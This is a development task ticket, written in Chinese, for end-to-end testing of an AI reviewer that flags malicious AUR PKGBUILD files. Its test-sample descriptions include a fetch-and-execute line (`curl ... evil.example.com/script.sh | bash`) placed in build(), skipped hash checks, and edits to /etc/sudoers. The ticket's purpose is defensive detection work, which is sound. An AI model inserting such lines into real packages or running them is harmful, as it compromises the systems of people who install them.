---
id: T6
title: "OpenCode prompt 优化与 E2E 验证 — 已知恶意 PKGBUILD 样本测试"
phase: 3
status: pending
dependencies: ["T5"]
assigned_to: backend
pr: ""
branch: "feat/ai-review-e2e"
---

# T6: AI 审查 prompt 优化与 E2E 验证

## 任务目标

在 T5（ai-review job）实现完成后，使用已知恶意 PKGBUILD 样本进行端到端测试：
- 验证 AI 对各攻击面的检出率
- 基于测试结果优化 prompt
- 确保假阳性率可接受
- 产出测试报告和优化后的 prompt

## 验收标准

1. 准备至少 3 个测试样本：
   - 已知安全的 AUR 包（如 `yay`、`paru`）— 验证假阳性率
   - 含 `curl | bash` 模式的恶意样本 — 验证"构建脚本安全"维度检出
   - 含 `sha256sums=('SKIP')` 跳过校验的样本 — 验证"源码完整性"维度检出
2. 对每个样本运行 `ai-review` job（单独或通过完整 workflow）
3. 记录每个样本各维度的 PASS/WARN/FAIL 判定
4. 安全的包不应出现 FAIL（允许个别 WARN）
5. 恶意样本的关键攻击面应被检出（FAIL 判定）
6. 如果检出率或假阳性不达标，迭代优化 prompt（通常 2-3 轮）
7. 最终 prompt 更新到 `security-scan.yml` 中
8. 产出测试报告（记录到 issue comment 或项目文档）

## 实现步骤

### Step 1: 准备测试样本

创建测试用 Git 仓库，包含不同安全级别的 PKGBUILD：

**样本 A — 安全包**：
- 使用 `yay` 的 PKGBUILD（community 维护，标准安全实践）
- 预期：所有维度 PASS 或 WARN，无 FAIL

**样本 B — 管道执行恶意模式**：
- PKGBUILD 的 `build()` 函数中包含 `curl -s https://evil.example.com/script.sh | bash`
- 预期：维度 2（构建脚本安全）FAIL

**样本 C — 跳过哈希校验**：
- PKGBUILD 的 `sha256sums` 使用 `('SKIP')`
- 预期：维度 1（源码完整性校验）WARN 或 FAIL

**样本 D（可选）— 危险系统操作**：
- PKGBUILD 的 `.install` 文件中修改 `/etc/sudoers`
- 预期：维度 2（构建脚本安全）FAIL

### Step 2: 运行测试

1. 对每个样本手动触发 Security Scan workflow
2. 等待 `ai-review` job 完成
3. 下载 Artifact 审查报告
4. 记录每个维度的判定

### Step 3: 评估与优化

1. 统计检出率：
   - 恶意样本的已知攻击面是否被检出？
   - 安全包是否有误报（假阳性 FAIL）？
2. 分析漏检原因：
   - Prompt 描述是否不够具体？
   - 某些攻击模式是否未被覆盖？
3. 优化 prompt：
   - 添加遗漏的检查项
   - 调整判定规则（如 WARN 和 FAIL 的边界）
   - 增加 AUR 特有的攻击示例
4. 更新 `security-scan.yml` 中的 prompt 内容
5. 重复测试直到达到满意水平

### Step 4: 产出报告

```markdown
## AI 审查 E2E 测试报告

| 样本 | 类型 | 预期 | 维度 1 | 维度 2 | 维度 3 | 维度 4 | 维度 5 | 维度 6 | 最终 | 是否符合预期 |
|------|------|------|--------|--------|--------|--------|--------|--------|------|-------------|
| yay | 安全 | PASS | PASS | PASS | PASS | PASS | PASS | PASS | PASS | ✅ |
| evil-1 | 管道执行 | FAIL | PASS | FAIL | PASS | PASS | PASS | PASS | FAIL | ✅ |
| evil-2 | 跳过哈希 | FAIL | FAIL | PASS | PASS | PASS | PASS | PASS | FAIL | ✅ |

### 检出率统计
- 恶意样本检出率: 2/2 (100%)
- 安全包假阳性率: 0/1 (0%)

### Prompt 变更
(记录每次 prompt 迭代的具体变更)
```

## 涉及文件

| 文件 | 操作 | 说明 |
|------|------|------|
| `.github/workflows/security-scan.yml` | 可能修改 | 优化 ai-review job 的 prompt |
| 测试样本仓库 | 新增（独立仓库） | 存放恶意/安全 PKGBUILD 样本 |
| 测试报告 | 新增（issue comment 或 docs/） | E2E 测试结果 |

## 测试方法

1. 对每个样本手动触发 workflow
2. 对比 AI 判定与人工预期
3. 统计检出率和假阳性率
4. 目标：恶意样本检出率 ≥ 80%，安全包假阳性率 ≤ 10%

## 参考

- 技术方案第 4 节 Prompt 设计说明：`docs/dev/specs/security-scan-workflow.md`
- 技术方案第 8 节 Phase 3 实施计划：`docs/dev/specs/security-scan-workflow.md`
- 技术方案第 9 节风险：假阳性/假阴性缓解措施
